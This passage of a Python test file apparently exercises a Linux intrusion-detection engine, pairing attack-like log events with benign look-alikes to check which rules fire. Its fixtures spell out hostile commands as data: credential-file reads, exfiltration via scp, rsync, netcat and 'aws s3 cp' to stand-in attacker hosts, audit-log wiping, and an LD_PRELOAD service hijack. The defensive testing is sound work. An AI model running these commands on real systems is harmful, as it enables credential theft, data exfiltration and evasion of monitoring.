            fields={"cmdline": "kubectl exec -n kube-system metrics-server -- /bin/true"},
        )
        follow_evt = NormalizedEvent(
            ts=exec_evt.ts + 10,
            host="node01",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="curl",
            message="curl -fsS http://127.0.0.1/healthz",
            fields={"cmdline": "curl -fsS http://127.0.0.1/healthz"},
        )

        first_hits = [r.rule_id for r in engine.analyze(exec_evt)]
        second_hits = [r.rule_id for r in engine.analyze(follow_evt)]

        assert "PROC-CONT-001" not in first_hits
        assert "SEQ-053" not in second_hits


class TestLatestHighValueSequences:
    def test_latest_high_value_sequences_are_loaded(self, engine):
        seq_ids = {seq["id"] for seq in engine.sequence.SEQUENCES}
        for seq_id in {"SEQ-054", "SEQ-055", "SEQ-056", "SEQ-057", "SEQ-058", "SEQ-059", "SEQ-067", "SEQ-068"}:
            assert seq_id in seq_ids

    def test_login_secret_read_then_transfer_sequence_alerts(self, engine, normalizer):
        login_evt = normalizer.normalize(
            "Mar  5 14:00:00 host sshd[2]: Accepted password for alice from 203.0.113.40 port 5555 ssh2",
            "auth.log",
        )
        secret_evt = NormalizedEvent(
            ts=login_evt.ts + 10,
            host="host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="alice",
            process="cat",
            message="cat /home/alice/.aws/credentials",
            fields={"cmdline": "cat /home/alice/.aws/credentials"},
        )
        transfer_evt = NormalizedEvent(
            ts=secret_evt.ts + 10,
            host="host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="alice",
            process="scp",
            message="scp /tmp/loot.tgz attacker@198.51.100.50:/tmp/loot.tgz",
            fields={"cmdline": "scp /tmp/loot.tgz attacker@198.51.100.50:/tmp/loot.tgz"},
        )

        engine.analyze(login_evt)
        engine.analyze(secret_evt)
        hits = [r.rule_id for r in engine.analyze(transfer_evt)]

        assert "SEQ-054" in hits

    def test_benign_login_kubectl_config_and_backup_do_not_alert_seq_054(self, engine, normalizer):
        login_evt = normalizer.normalize(
            "Mar  5 14:01:00 host sshd[2]: Accepted publickey for alice from 203.0.113.41 port 5555 ssh2",
            "auth.log",
        )
        benign_secret_evt = NormalizedEvent(
            ts=login_evt.ts + 10,
            host="host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="alice",
            process="kubectl",
            message="kubectl config view --kubeconfig /home/alice/.kube/config",
            fields={"cmdline": "kubectl config view --kubeconfig /home/alice/.kube/config"},
        )
        benign_transfer_evt = NormalizedEvent(
            ts=benign_secret_evt.ts + 10,
            host="host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="alice",
            process="rsync",
            message="rsync /var/backups/etc-nightly.tgz backup@198.51.100.60:/srv/backup/",
            fields={"cmdline": "rsync /var/backups/etc-nightly.tgz backup@198.51.100.60:/srv/backup/"},
        )

        engine.analyze(login_evt)
        engine.analyze(benign_secret_evt)
        hits = [r.rule_id for r in engine.analyze(benign_transfer_evt)]

        assert "SEQ-054" not in hits

    def test_login_then_account_persistence_change_sequence_alerts(self, engine, normalizer):
        login_evt = normalizer.normalize(
            "Mar  5 14:02:00 host sshd[2]: Accepted password for alice from 203.0.113.42 port 5555 ssh2",
            "auth.log",
        )
        persist_evt = NormalizedEvent(
            ts=login_evt.ts + 20,
            host="host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="alice",
            process="usermod",
            message="usermod -aG sudo bob",
            fields={"cmdline": "usermod -aG sudo bob"},
        )

        engine.analyze(login_evt)
        hits = [r.rule_id for r in engine.analyze(persist_evt)]

        assert "SEQ-055" in hits

    def test_benign_config_management_account_change_does_not_alert_seq_055(self, engine, normalizer):
        login_evt = normalizer.normalize(
            "Mar  5 14:03:00 host sshd[2]: Accepted publickey for alice from 203.0.113.43 port 5555 ssh2",
            "auth.log",
        )
        benign_evt = NormalizedEvent(
            ts=login_evt.ts + 20,
            host="host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="alice",
            process="ansible-playbook",
            message="ansible-playbook users.yml && visudo -f /etc/sudoers.d/alice",
            fields={"cmdline": "ansible-playbook users.yml && visudo -f /etc/sudoers.d/alice"},
        )

        engine.analyze(login_evt)
        hits = [r.rule_id for r in engine.analyze(benign_evt)]

        assert "SEQ-055" not in hits

    def test_login_discovery_privesc_then_secret_sequence_alerts(self, engine):
        login_evt = _auth_evt(time.time(), user="alice", host="dar-privesc-01")
        discovery_evt = _proc_evt(
            login_evt.ts + 10,
            "sudo -l && getent group sudo && cat /etc/sudoers.d",
            host="dar-privesc-01",
            user="alice",
            process="bash",
        )
        privesc_evt = _proc_evt(
            discovery_evt.ts + 10,
            "sudo su -",
            host="dar-privesc-01",
            user="alice",
            process="sudo",
        )
        secret_evt = _proc_evt(
            privesc_evt.ts + 10,
            "cat /root/.aws/credentials",
            host="dar-privesc-01",
            user="root",
            process="cat",
        )

        engine.analyze(login_evt)
        engine.analyze(discovery_evt)
        engine.analyze(privesc_evt)
        hits = [r.rule_id for r in engine.analyze(secret_evt)]

        assert "SEQ-067" in hits

    def test_login_discovery_doas_then_sudoers_change_sequence_alerts(self, engine):
        login_evt = _auth_evt(time.time(), user="alice", host="dar-privesc-02")
        discovery_evt = _proc_evt(
            login_evt.ts + 10,
            "doas -L && getent group wheel",
            host="dar-privesc-02",
            user="alice",
            process="sh",
        )
        privesc_evt = _proc_evt(
            discovery_evt.ts + 10,
            "doas -s",
            host="dar-privesc-02",
            user="alice",
            process="doas",
        )
        persist_evt = _proc_evt(
            privesc_evt.ts + 10,
            "visudo -f /etc/sudoers.d/alice",
            host="dar-privesc-02",
            user="root",
            process="visudo",
        )

        engine.analyze(login_evt)
        engine.analyze(discovery_evt)
        engine.analyze(privesc_evt)
        hits = [r.rule_id for r in engine.analyze(persist_evt)]

        assert "SEQ-067" in hits

    def test_benign_discovery_then_config_management_does_not_alert_seq_067(self, engine):
        login_evt = _auth_evt(time.time(), user="alice", host="dar-privesc-benign-01")
        discovery_evt = _proc_evt(
            login_evt.ts + 10,
            "sudo -l && getent group wheel",
            host="dar-privesc-benign-01",
            user="alice",
            process="bash",
        )
        benign_evt = _proc_evt(
            discovery_evt.ts + 10,
            "chef-client && usermod -aG wheel bob",
            host="dar-privesc-benign-01",
            user="root",
            process="chef-client",
        )

        engine.analyze(login_evt)
        engine.analyze(discovery_evt)
        hits = [r.rule_id for r in engine.analyze(benign_evt)]

        assert "SEQ-067" not in hits

    def test_login_privesc_account_manip_then_remote_access_sequence_alerts(self, engine):
        login_evt = _auth_evt(time.time(), user="alice", host="dar-account-01")
        privesc_evt = _proc_evt(
            login_evt.ts + 10,
            "sudo su -",
            host="dar-account-01",
            user="alice",
            process="sudo",
        )
        acct_evt = _proc_evt(
            privesc_evt.ts + 10,
            "usermod -U -s /bin/bash -d /home/bob -m bob",
            host="dar-account-01",
            user="root",
            process="usermod",
        )
        persist_evt = _proc_evt(
            acct_evt.ts + 10,
            "tee /home/bob/.ssh/authorized_keys",
            host="dar-account-01",
            user="root",
            process="tee",
        )

        engine.analyze(login_evt)
        engine.analyze(privesc_evt)
        engine.analyze(acct_evt)
        hits = [r.rule_id for r in engine.analyze(persist_evt)]

        assert "SEQ-068" in hits

    def test_benign_account_management_then_maintenance_does_not_alert_seq_068(self, engine):
        login_evt = _auth_evt(time.time(), user="alice", host="dar-account-benign-01")
        acct_evt = _proc_evt(
            login_evt.ts + 10,
            "ansible-playbook users.yml && useradd --system --shell /usr/sbin/nologin svc-app",
            host="dar-account-benign-01",
            user="root",
            process="ansible-playbook",
        )
        maint_evt = _proc_evt(
            acct_evt.ts + 10,
            "chef-client && systemctl preset app.service",
            host="dar-account-benign-01",
            user="root",
            process="chef-client",
        )

        engine.analyze(login_evt)
        engine.analyze(acct_evt)
        hits = [r.rule_id for r in engine.analyze(maint_evt)]

        assert "SEQ-068" not in hits


class TestDarPrivilegeEscalationDistroParity:
    @pytest.mark.parametrize(
        ("distro_family", "cmdline"),
        [
            pytest.param("debian", "usermod -aG sudo bob", id="debian-sudo-group"),
            pytest.param("rhel", "usermod -aG wheel bob", id="rhel-wheel-group"),
            pytest.param("suse", "gpasswd -a bob wheel", id="suse-wheel-group"),
        ],
    )
    def test_positive_admin_group_abuse_rules_cover_supported_distros(self, engine, distro_family, cmdline):
        evt = _proc_evt(
            time.time(),
            cmdline,
            host=f"{distro_family}-privesc-pos",
            user="alice",
            process=cmdline.split()[0],
            distro_family=distro_family,
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "PERS-012" in hits
        assert "PRIVESC-011" in hits

    @pytest.mark.parametrize(
        ("distro_family", "cmdline"),
        [
            pytest.param("debian", "ansible-playbook users.yml && usermod -aG sudo bob", id="debian-benign-cm"),
            pytest.param("rhel", "chef-client && usermod -aG wheel bob", id="rhel-benign-cm"),
            pytest.param("suse", "salt-call state.apply users && gpasswd -a bob wheel", id="suse-benign-cm"),
        ],
    )
    def test_benign_admin_group_management_is_excluded_per_distro(self, engine, distro_family, cmdline):
        evt = _proc_evt(
            time.time(),
            cmdline,
            host=f"{distro_family}-privesc-benign",
            user="root",
            process=cmdline.split()[0],
            distro_family=distro_family,
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "PERS-012" not in hits
        assert "PRIVESC-011" not in hits

    def test_pkexec_and_doas_privesc_rules_alert(self, engine):
        pkexec_evt = _proc_evt(
            time.time(),
            "pkexec /bin/bash",
            host="dar-privesc-pkexec",
            user="alice",
            process="pkexec",
            distro_family="rhel",
        )
        doas_evt = _proc_evt(
            pkexec_evt.ts + 5,
            "doas -s",
            host="dar-privesc-doas",
            user="alice",
            process="doas",
            distro_family="suse",
        )

        pkexec_hits = [r.rule_id for r in engine.analyze(pkexec_evt)]
        doas_hits = [r.rule_id for r in engine.analyze(doas_evt)]

        assert "PRIVESC-010" in pkexec_hits
        assert "PRIVESC-010" in doas_hits


class TestDarAccountManipulationDistroParity:
    @pytest.mark.parametrize(
        ("distro_family", "cmdline"),
        [
            pytest.param("debian", "useradd -m -s /bin/bash opssvc", id="debian-useradd-interactive"),
            pytest.param("rhel", "usermod -U -s /bin/bash bob", id="rhel-unlock-shell"),
            pytest.param("suse", "groupmod -n admin-wheel wheel", id="suse-groupmod-admin"),
        ],
    )
    def test_positive_account_identity_abuse_rule_covers_supported_distros(self, engine, distro_family, cmdline):
        evt = _proc_evt(
            time.time(),
            cmdline,
            host=f"{distro_family}-acct-pos",
            user="root",
            process=cmdline.split()[0],
            distro_family=distro_family,
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "PERS-018" in hits

    @pytest.mark.parametrize(
        ("distro_family", "cmdline"),
        [
            pytest.param("debian", "ansible-playbook users.yml && useradd --system --shell /usr/sbin/nologin svc-app", id="debian-system-user-benign"),
            pytest.param("rhel", "chef-client && usermod -L -s /usr/sbin/nologin svc-app", id="rhel-service-user-benign"),
            pytest.param("suse", "salt-call state.apply users && groupadd --system svcgroup", id="suse-system-group-benign"),
        ],
    )
    def test_benign_account_identity_admin_flows_are_excluded_per_distro(self, engine, distro_family, cmdline):
        evt = _proc_evt(
            time.time(),
            cmdline,
            host=f"{distro_family}-acct-benign",
            user="root",
            process=cmdline.split()[0],
            distro_family=distro_family,
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "PERS-018" not in hits


class TestDarServiceHijackDistroParity:
    @pytest.mark.parametrize(
        ("distro_family", "cmdline"),
        [
            pytest.param("debian", "printf '[Service]\\nEnvironment=LD_PRELOAD=/tmp/evil.so\\n' > /etc/systemd/system/ssh.service.d/override.conf && systemctl daemon-reload && systemctl restart ssh", id="debian-override-restart"),
            pytest.param("rhel", "printf '[Service]\\nExecStart=/usr/local/bin/sshd-wrapper\\n' > /etc/systemd/system/sshd.service.d/override.conf && systemctl daemon-reload && systemctl restart sshd", id="rhel-execstart-wrapper"),
            pytest.param("suse", "install -m 755 wrapper.sh /etc/init.d/cron-wrapper && insserv /etc/init.d/cron-wrapper && service cron-wrapper restart", id="suse-initd-wrapper"),
        ],
    )
    def test_positive_service_hijack_rule_covers_supported_distros(self, engine, distro_family, cmdline):
        evt = _proc_evt(
            time.time(),
            cmdline,
            host=f"{distro_family}-svc-pos",
            user="root",
            process=cmdline.split()[0],
            distro_family=distro_family,
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "PERS-019" in hits

    @pytest.mark.parametrize(
        ("distro_family", "cmdline"),
        [
            pytest.param("debian", "apt-get install --yes openssh-server && systemctl daemon-reload && systemctl restart ssh", id="debian-package-restart"),
            pytest.param("rhel", "dnf update -y openssh-server && systemctl daemon-reload && systemctl restart sshd", id="rhel-package-restart"),
            pytest.param("suse", "zypper update -y cron && systemctl daemon-reload && systemctl restart cron", id="suse-package-restart"),
        ],
    )
    def test_benign_service_admin_flows_are_excluded_per_distro(self, engine, distro_family, cmdline):
        evt = _proc_evt(
            time.time(),
            cmdline,
            host=f"{distro_family}-svc-benign",
            user="root",
            process=cmdline.split()[0],
            distro_family=distro_family,
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "PERS-019" not in hits


class TestDarToolInstallDistroParity:
    @pytest.mark.parametrize(
        ("source", "package", "cmdline", "process", "distro_family"),
        [
            pytest.param("dpkg", "netcat-openbsd", "nc 198.51.100.14 4444 < /tmp/loot.bin", "nc", "debian", id="debian-netcat-openbsd"),
            pytest.param("dnf", "nmap-ncat", "ncat 198.51.100.15 5555 < /tmp/loot.bin", "ncat", "rhel", id="rhel-nmap-ncat"),
            pytest.param("zypper", "python3-awscli", "aws s3 cp /tmp/loot.tgz s3://attacker-bucket/loot.tgz", "aws", "suse", id="suse-python3-awscli"),
        ],
    )
    def test_positive_tool_install_rule_covers_supported_distros(self, engine, source, package, cmdline, process, distro_family):
        hits = _collect_rule_ids(
            engine,
            [
                NormalizedEvent(ts=time.time(), host=f"{distro_family}-tool-pos", source=source, category="process", action="pkg_install", outcome="success", process="pkg-install", message=f"install {package}", fields={"package": package, "cmdline": f"install {package}"}, distro_family=distro_family),
                _proc_evt(time.time() + 20, cmdline, host=f"{distro_family}-tool-pos", user="root", process=process, distro_family=distro_family),
            ],
        )

        assert "PKG-011" in hits
        assert "SEQ-051" in hits
        assert "SEQ-058" in hits

    @pytest.mark.parametrize(
        ("source", "package", "cmdline", "process", "distro_family"),
        [
            pytest.param("dpkg", "curl", "unattended-upgrades --dry-run", "unattended-upgrades", "debian", id="debian-unattended-upgrades"),
            pytest.param("dnf", "curl", "subscription-manager refresh", "subscription-manager", "rhel", id="rhel-subscription-refresh"),
            pytest.param("zypper", "wget", "transactional-update patch", "transactional-update", "suse", id="suse-transactional-patch"),
        ],
    )
    def test_benign_tool_install_flows_are_excluded_per_distro(self, engine, source, package, cmdline, process, distro_family):
        hits = _collect_rule_ids(
            engine,
            [
                NormalizedEvent(ts=time.time(), host=f"{distro_family}-tool-benign", source=source, category="process", action="pkg_install", outcome="success", process="pkg-install", message=f"install {package}", fields={"package": package, "cmdline": f"install {package}"}, distro_family=distro_family),
                _proc_evt(time.time() + 20, cmdline, host=f"{distro_family}-tool-benign", user="root", process=process, distro_family=distro_family),
            ],
        )

        assert "SEQ-051" not in hits
        assert "SEQ-058" not in hits

    def test_web_exploit_then_persistence_sequence_alerts(self, engine):
        web_evt = NormalizedEvent(
            ts=time.time(),
            host="web02",
            src_ip="203.0.113.44",
            source="nginx",
            category="web_attack",
            action="shell_upload",
            outcome="success",
            message="POST /upload/avatar.php.jpg -> 200",
            fields={
                "attack": "shell_upload",
                "method": "POST",
                "path": "/upload/avatar.php.jpg",
                "path_lc": "/upload/avatar.php.jpg",
                "path_decoded": "/upload/avatar.php.jpg",
                "path_decoded_lc": "/upload/avatar.php.jpg",
                "status": 200,
                "ua": "Mozilla/5.0",
                "ua_lc": "mozilla/5.0",
            },
        )
        persist_evt = NormalizedEvent(
            ts=web_evt.ts + 10,
            host="web02",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="www-data",
            process="systemctl",
            message="cp shell.service /etc/systemd/system/shell.service && systemctl enable --now shell.service",
            fields={"cmdline": "cp shell.service /etc/systemd/system/shell.service && systemctl enable --now shell.service"},
        )

        engine.analyze(web_evt)
        hits = [r.rule_id for r in engine.analyze(persist_evt)]

        assert "SEQ-056" in hits

    def test_benign_admin_upload_and_maintenance_do_not_alert_seq_056(self, engine):
        web_evt = NormalizedEvent(
            ts=time.time(),
            host="web02",
            src_ip="203.0.113.45",
            source="nginx",
            category="network",
            action="http_request",
            outcome="success",
            message="POST /admin/upload/theme.zip -> 200",
            fields={
                "method": "POST",
                "path": "/admin/upload/theme.zip",
                "path_lc": "/admin/upload/theme.zip",
                "path_decoded": "/admin/upload/theme.zip",
                "path_decoded_lc": "/admin/upload/theme.zip",
                "status": 200,
                "ua": "Mozilla/5.0",
                "ua_lc": "mozilla/5.0",
            },
        )
        maintain_evt = NormalizedEvent(
            ts=web_evt.ts + 15,
            host="web02",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="www-data",
            process="systemctl",
            message="apt-get install --yes packagekit && systemctl preset apt-daily.timer",
            fields={"cmdline": "apt-get install --yes packagekit && systemctl preset apt-daily.timer"},
        )

        engine.analyze(web_evt)
        hits = [r.rule_id for r in engine.analyze(maintain_evt)]

        assert "SEQ-056" not in hits

    def test_log_tamper_then_exfil_sequence_alerts(self, engine):
        tamper_evt = NormalizedEvent(
            ts=time.time(),
            host="ops01",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="systemctl",
            message="systemctl stop auditd && truncate -s 0 /var/log/auth.log",
            fields={"cmdline": "systemctl stop auditd && truncate -s 0 /var/log/auth.log"},
        )
        exfil_evt = NormalizedEvent(
            ts=tamper_evt.ts + 15,
            host="ops01",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="rsync",
            message="rsync /tmp/loot.tgz attacker@198.51.100.70:/tmp/loot.tgz",
            fields={"cmdline": "rsync /tmp/loot.tgz attacker@198.51.100.70:/tmp/loot.tgz"},
        )

        engine.analyze(tamper_evt)
        hits = [r.rule_id for r in engine.analyze(exfil_evt)]

        assert "SEQ-057" in hits

    def test_benign_logrotate_and_backup_do_not_alert_seq_057(self, engine):
        tamper_evt = NormalizedEvent(
            ts=time.time(),
            host="ops01",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="logrotate",
            message="logrotate -f /etc/logrotate.conf && systemctl restart rsyslog",
            fields={"cmdline": "logrotate -f /etc/logrotate.conf && systemctl restart rsyslog"},
        )
        benign_evt = NormalizedEvent(
            ts=tamper_evt.ts + 15,
            host="ops01",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="restic",
            message="restic backup /var/backups",
            fields={"cmdline": "restic backup /var/backups"},
        )

        engine.analyze(tamper_evt)
        hits = [r.rule_id for r in engine.analyze(benign_evt)]

        assert "SEQ-057" not in hits

    def test_package_install_then_transfer_sequence_alerts(self, engine):
        install_evt = NormalizedEvent(
            ts=time.time(),
            host="pkg01",
            source="journald",
            category="process",
            action="pkg_install",
            outcome="success",
            process="apt-get",
            message="apt-get install -y rclone",
            fields={"package": "rclone", "cmdline": "apt-get install -y rclone"},
        )
        abuse_evt = NormalizedEvent(
            ts=install_evt.ts + 30,
            host="pkg01",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="rclone",
            message="rclone copy /tmp/loot.tgz remote:loot",
            fields={"cmdline": "rclone copy /tmp/loot.tgz remote:loot"},
        )

        engine.analyze(install_evt)
        hits = [r.rule_id for r in engine.analyze(abuse_evt)]

        assert "SEQ-058" in hits

    def test_benign_package_install_and_maintenance_do_not_alert_seq_058(self, engine):
        install_evt = NormalizedEvent(
            ts=time.time(),
            host="pkg01",
            source="journald",
            category="process",
            action="pkg_install",
            outcome="success",
            process="apt-get",
            message="apt-get install -y curl",
            fields={"package": "curl", "cmdline": "apt-get install -y curl"},
        )
        benign_evt = NormalizedEvent(
            ts=install_evt.ts + 30,
            host="pkg01",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="systemctl",
            message="systemctl preset apt-daily.timer",
            fields={"cmdline": "systemctl preset apt-daily.timer"},
        )

        engine.analyze(install_evt)
        hits = [r.rule_id for r in engine.analyze(benign_evt)]

        assert "SEQ-058" not in hits

    def test_container_exec_then_secret_read_sequence_alerts(self, engine):
        exec_evt = NormalizedEvent(
            ts=time.time(),
            host="node02",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="docker",
            message="docker exec -it webapp sh",
            fields={"cmdline": "docker exec -it webapp sh"},
        )
        secret_evt = NormalizedEvent(
            ts=exec_evt.ts + 10,
            host="node02",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="cat",
            message="cat /host/root/.ssh/id_rsa",
            fields={"cmdline": "cat /host/root/.ssh/id_rsa"},
        )

        engine.analyze(exec_evt)
        hits = [r.rule_id for r in engine.analyze(secret_evt)]

        assert "SEQ-059" in hits

    def test_benign_container_healthcheck_do_not_alert_seq_059(self, engine):
        exec_evt = NormalizedEvent(
            ts=time.time(),
            host="node02",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="kubectl",
            message="kubectl exec -n kube-system metrics-server -- /bin/true",
            fields={"cmdline": "kubectl exec -n kube-system metrics-server -- /bin/true"},
        )
        follow_evt = NormalizedEvent(
            ts=exec_evt.ts + 10,
            host="node02",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="curl",
            message="curl -fsS http://127.0.0.1/healthz",
            fields={"cmdline": "curl -fsS http://127.0.0.1/healthz"},
        )

        engine.analyze(exec_evt)
        hits = [r.rule_id for r in engine.analyze(follow_evt)]

        assert "SEQ-059" not in hits

    def test_config_management_service_rollout_does_not_alert_seq_047_or_seq_048(self, engine, normalizer):
        login_evt = normalizer.normalize(
            "Mar  5 14:04:00 host sshd[2]: Accepted publickey for alice from 203.0.113.46 port 5555 ssh2",
            "auth.log",
        )
        create_evt = NormalizedEvent(
            ts=login_evt.ts + 10,
            host="host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="alice",
            process="ansible-playbook",
            message="ansible-playbook deploy.yml --extra-vars service_path=/etc/systemd/system/app.service",
            fields={"cmdline": "ansible-playbook deploy.yml --extra-vars service_path=/etc/systemd/system/app.service"},
        )
        enable_evt = NormalizedEvent(
            ts=create_evt.ts + 20,
            host="host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="alice",
            process="systemctl",
            message="systemctl restart app.service && systemctl reload nginx",
            fields={"cmdline": "systemctl restart app.service && systemctl reload nginx"},
        )

        engine.analyze(login_evt)
        engine.analyze(create_evt)
        hits = [r.rule_id for r in engine.analyze(enable_evt)]

        assert "SEQ-047" not in hits
        assert "SEQ-048" not in hits

    def test_login_then_benign_journal_rotation_does_not_alert_seq_050(self, engine, normalizer):
        login_evt = normalizer.normalize(
            "Mar  5 14:05:00 host sshd[2]: Accepted password for alice from 203.0.113.47 port 5555 ssh2",
            "auth.log",
        )
        benign_evt = NormalizedEvent(
            ts=login_evt.ts + 20,
            host="host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="alice",
            process="journalctl",
            message="journalctl --rotate && journalctl --sync",
            fields={"cmdline": "journalctl --rotate && journalctl --sync"},
        )

        engine.analyze(login_evt)
        hits = [r.rule_id for r in engine.analyze(benign_evt)]

        assert "SEQ-050" not in hits

    def test_package_install_then_config_management_does_not_alert_seq_051_or_seq_058(self, engine):
        install_evt = NormalizedEvent(
            ts=time.time(),
            host="pkg02",
            source="journald",
            category="process",
            action="pkg_install",
            outcome="success",
            process="apt-get",
            message="apt-get install -y curl",
            fields={"package": "curl", "cmdline": "apt-get install -y curl"},
        )
        benign_evt = NormalizedEvent(
            ts=install_evt.ts + 30,
            host="pkg02",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="ansible-playbook",
            message="ansible-playbook maintenance.yml",
            fields={"cmdline": "ansible-playbook maintenance.yml"},
        )

        engine.analyze(install_evt)
        hits = [r.rule_id for r in engine.analyze(benign_evt)]

        assert "SEQ-051" not in hits
        assert "SEQ-058" not in hits

    def test_container_exec_then_backup_sync_does_not_alert_seq_053_or_seq_059(self, engine):
        exec_evt = NormalizedEvent(
            ts=time.time(),
            host="node03",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="docker",
            message="docker exec -it backup-agent sh",
            fields={"cmdline": "docker exec -it backup-agent sh"},
        )
        benign_evt = NormalizedEvent(
            ts=exec_evt.ts + 15,
            host="node03",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="rsync",
            message="rsync /var/backups/node03.tgz backup@198.51.100.80:/srv/backup/",
            fields={"cmdline": "rsync /var/backups/node03.tgz backup@198.51.100.80:/srv/backup/"},
        )

        engine.analyze(exec_evt)
        hits = [r.rule_id for r in engine.analyze(benign_evt)]

        assert "SEQ-053" not in hits
        assert "SEQ-059" not in hits


class TestSecretAccessCoverage:
    @pytest.mark.parametrize(
        ("events_builder", "expected"),
        [
            pytest.param(
                lambda: [_proc_evt(time.time(), "cat /srv/app/.env | base64", process="bash")],
                {"PROC-CRED-001"},
                id="journald-env-read",
            ),
            pytest.param(
                lambda: [_proc_evt(time.time(), "cat /run/secrets/db_password", process="cat")],
                {"PROC-CRED-001"},
                id="journald-run-secrets-read",
            ),
            pytest.param(
                lambda: [
                    _auth_evt(time.time(), user="alice", host="secret-seq"),
                    _proc_evt(time.time() + 5, "cat /home/alice/.aws/credentials", host="secret-seq", user="alice", process="cat"),
                    _proc_evt(time.time() + 10, "scp /tmp/loot.tgz attacker@198.51.100.90:/tmp/loot.tgz", host="secret-seq", user="alice", process="scp"),
                ],
                {"SEQ-054"},
                id="post-login-secret-sequence",
            ),
        ],
    )
    def test_positive_secret_access_coverage(self, engine, events_builder, expected):
        hits = _collect_rule_ids(engine, events_builder())
        for rule_id in expected:
            assert rule_id in hits

    @pytest.mark.parametrize(
        ("evt", "forbidden"),
        [
            pytest.param(
                _proc_evt(time.time(), "kubectl config view --kubeconfig /home/alice/.kube/config", process="kubectl"),
                {"PROC-CRED-001"},
                id="kubectl-config-view",
            ),
            pytest.param(
                _proc_evt(time.time(), "gcloud auth application-default login", process="gcloud"),
                {"PROC-CRED-001"},
                id="gcloud-adc-login",
            ),
            pytest.param(
                _proc_evt(time.time(), "mysqladmin --print-defaults", process="mysqladmin"),
                {"PROC-CRED-001"},
                id="mysqladmin-print-defaults",
            ),
        ],
    )
    def test_benign_secret_access_coverage(self, engine, evt, forbidden):
        hits = _collect_rule_ids(engine, [evt])
        for rule_id in forbidden:
            assert rule_id not in hits

    def test_netrc_secret_read_is_now_covered(self, engine):
        hits = _collect_rule_ids(
            engine,
            [_proc_evt(time.time(), "cat /root/.netrc | base64", process="cat", user="root")],
        )
        assert "PROC-CRED-001" in hits

    @pytest.mark.parametrize(
        ("distro_family", "cmdline", "process"),
        [
            pytest.param("debian", "cat /etc/apt/auth.conf | base64", "cat", id="debian-apt-auth"),
            pytest.param("rhel", "python3 -c \"print(open('/etc/rhsm/rhsm.conf').read())\"", "python3", id="rhel-rhsm"),
            pytest.param("suse", "cp /etc/zypp/credentials.d/SCCcredentials /tmp/SCCcredentials", "cp", id="suse-zypp-creds"),
        ],
    )
    def test_positive_secret_access_coverage_covers_supported_distros(self, engine, distro_family, cmdline, process):
        hits = _collect_rule_ids(
            engine,
            [_proc_evt(time.time(), cmdline, process=process, user="root", distro_family=distro_family)],
        )
        assert "PROC-CRED-001" in hits

    @pytest.mark.parametrize(
        ("distro_family", "cmdline", "process"),
        [
            pytest.param("debian", "less /etc/apt/auth.conf", "less", id="debian-apt-auth-view"),
            pytest.param("rhel", "stat /etc/rhsm/rhsm.conf", "stat", id="rhel-rhsm-stat"),
            pytest.param("suse", "vim /etc/zypp/credentials.d/SCCcredentials", "vim", id="suse-zypp-creds-edit"),
        ],
    )
    def test_benign_secret_access_coverage_excludes_supported_distros(self, engine, distro_family, cmdline, process):
        hits = _collect_rule_ids(
            engine,
            [_proc_evt(time.time(), cmdline, process=process, user="root", distro_family=distro_family)],
        )
        assert "PROC-CRED-001" not in hits


class TestArchiveExfilCoverage:
    @pytest.mark.parametrize(
        ("events_builder", "expected"),
        [
            pytest.param(
                lambda: [_proc_evt(time.time(), "tar czf /tmp/etc-ssh.tgz /etc/ssh /home/alice/.aws/credentials", host="archive-cov", process="tar")],
                {"PROC-EXFIL-001"},
                id="temp-archive-sensitive-files",
            ),
            pytest.param(
                lambda: [_proc_evt(time.time(), "rsync /tmp/loot.tgz attacker@198.51.100.91:/tmp/loot.tgz", host="archive-cov", process="rsync")],
                {"PROC-EXFIL-002"},
                id="temp-rsync-transfer",
            ),
            pytest.param(
                lambda: [
                    _proc_evt(time.time(), "zip -r /tmp/cloud.zip /srv/app/.env /home/alice/.aws/credentials", host="archive-seq", process="zip"),
                    _proc_evt(time.time() + 5, "scp /tmp/cloud.zip attacker@198.51.100.92:/tmp/cloud.zip", host="archive-seq", process="scp"),
                ],
                {"SEQ-045"},
                id="archive-then-scp-sequence",
            ),
            pytest.param(
                lambda: [
                    _proc_evt(time.time(), "tar czf /tmp/loot.tgz /srv/app/.env /home/alice/.aws/credentials", host="archive-seq-aws", process="tar"),
                    _proc_evt(time.time() + 5, "aws s3 cp /tmp/loot.tgz s3://attacker-bucket/loot.tgz", host="archive-seq-aws", process="aws"),
                ],
                {"PROC-EXFIL-002", "SEQ-045"},
                id="archive-then-aws-s3-cp-sequence",
            ),
        ],
    )
    def test_positive_archive_exfil_coverage(self, engine, events_builder, expected):
